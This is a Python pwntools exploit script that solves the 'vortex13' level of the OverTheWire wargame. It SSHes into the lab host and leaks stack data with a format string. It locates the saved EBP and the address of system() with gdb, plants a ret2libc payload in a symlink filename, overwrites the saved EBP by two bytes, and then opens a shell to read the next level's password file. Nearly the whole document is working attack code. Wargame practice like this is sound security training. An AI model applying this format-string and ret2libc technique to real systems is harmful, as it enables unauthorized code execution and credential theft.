#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
# An alternative solution for vortex13. Overwrite two bytes
# in the saved ebp on the stack. Once the pointer is popped
# from the stack we can take control using a ret2libc with
# gadgets in our filename.
#

from pwn import *
context(arch='i386', os='linux')

level    = 13
host     = 'vortex.labs.overthewire.org'
user     = 'vortex%i' % level
chal     = 'vortex%i' % level
password = args['PASSWORD']
passfile = '/etc/vortex_pass/vortex%i' % (level+1)
binary   = '/vortex/%s' % chal
shell    = ssh(host=host, user=user, password=password)

if not os.path.exists(chal):
    shell.download_file(binary)
    os.chmod(chal, 0755)

#
# Step 0:
#
# Be able to execute the program with argc==0
#
# Inconveniently, this also "appears" to break debugging
# on the remote machine.  Lots of warnings and errors.
# However, it still works fine if you hit "continue".
#
with file('noarg.c', 'w+') as noarg:
    noarg.write("""
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    execve(argv[1], NULL, NULL);
}
""")

shell.set_working_directory()
shell.upload_file('noarg.c')
shell.run('gcc -m32 -o noarg noarg.c')
shell.run('chmod +x noarg')

#
# Step 1:
#
# Find the name of the program on the stack
#
# To do this, we will create a symlink to the target binary
# with a large cyclic name, and search for the pattern on
# the stack.
#
# Use a huge filename. It will contain our ret2libc later
# on and only want to worry about it's alignment once.
#
symlink = cyclic(200)
offset  = -1
shell.ln(['-s', binary, symlink])


# Params of (110,120) chosen after example in win.py
for index in range(110, 120):
    with shell.run('./noarg ./%s' % symlink) as ch:
        ch.sendline('%{}$X'.format(index))
        response = ch.recvline().strip()
        try:
            data = unhex(response)
            assert len(data) == 4
        except Exception:
            continue

        offset = cyclic_find(data[::-1])
        if 0 <= offset and offset < 0x100:
            break

log.info("Found binary name on stack in arg %i at offset %i" % (index, offset))

#
# Step 2:
#
# We want to overwrite the ebp that is pushed on the stack
# in the prologue of vuln() at 0x0804858d. Locate the
# stack address using gdb. I used an exact address to set
# the breakpoint. Breaking on vuln didn't work as expected
#
# (gdb) disas vuln
# Dump of assembler code for function vuln:
#    0x0804858d <+0>:	push   ebp
#
# At the same time determine the value of ebp and the
# location of the filename on the stack.
#
with shell.run('gdb noarg') as g:
    g.send('''
    set prompt
    set follow-fork-mode child
    set disassembly-flavor intel
    set breakpoint pending on
    #break vuln
    break *0x0804858d
    commands
        #x/10i $eip
        info reg esp
        info reg ebp
        x/300s $esp
    end

    r %s
    finish
    ''' % symlink)

    # Retrieve address of ebp on stack
    g.recvuntil("in vuln ()\n")
    esp = g.recvline()
    esp = eval(esp.split()[1])
    saved_ebp = esp - 4

    # Retrieve value of ebp before it's pushed
    ebp = g.recvline()
    ebp = eval(ebp.split()[1])

    # Retrieve address of filename on stack
    g.recvuntil("aaaabaaacaaad")
    g.recvline()
    tmp = g.recvline()
    tmp = eval(tmp.split()[0].rstrip(":"))
    filename_on_stack = tmp - 200

log.info("Found saved EBP on stack at address: %s" % hex(saved_ebp))
log.info("Found EBP value: %s" % hex(ebp))
log.info("Found filename on stack at address: %s" % hex(filename_on_stack))

#
# Step 3:
#
# We want to overwrite the saved ebp with system() in libc.
# Determine the address of system()
#
libs = gdb.find_module_addresses(binary, ssh=shell)
libc = next(l for l in libs if 'libc' in l.path)
system = libc.symbols['system']
log.info("%#x system" % system)

#
# Step 4:
#
# Generate our filename with the payload
#
sh = filename_on_stack+198

f = "X"			# padding
f += p32(saved_ebp)	# address to overwrite w format string
f += "AAAA"*2		# padding
f += "BBBB"		# popped into EBP
f += p32(system)	# popped into EIP
f += "CCCC"		# padding
f += p32(sh) 		# pointer to "sh" at the end of this string
f += "A"*169		# padding
f += "sh"		# input for system()

# sanity check: the new symbolic link can't contain any
# newlines or forward slashes
not_allowed = ["\x0a", "\x2f"]
if any([x in not_allowed for x in f]):
	log.error("Filename contains invalid characters")

shell.ln(['-s', binary, f])

#
# Step 5:
#
# Overwrite saved ebp
#
# We want to set the new ebp to offset 13 in our filename,
# so "BBBB" is popped. Due to the limited format string
# we can only overwrite two bytes. Take the two least
# significant ones.

new_ebp = filename_on_stack + 13
# sanity check: we overwrite the two LSB of the saved ebp
# to `new_ebp`. the two MSB must be the same.
if (ebp & 0xffff0000) != (new_ebp & 0xffff0000):
    log.error("Two-byte overwrite will not suffice")

fmt = '%{}x%{}$hn'.format(new_ebp & 0xffff, index)
log.info("Format string: %r" % fmt)

ch = shell.run('./noarg ./$%r' % f)
ch.sendline(fmt)

#
# Win
#
ch.clean(2)
ch.sendline('id')
log.success('id: ' + ch.recvline().strip())

ch.sendline('cat %s' % passfile)
password = ch.recvline().strip()
log.success('Password: %s' % password)

print password
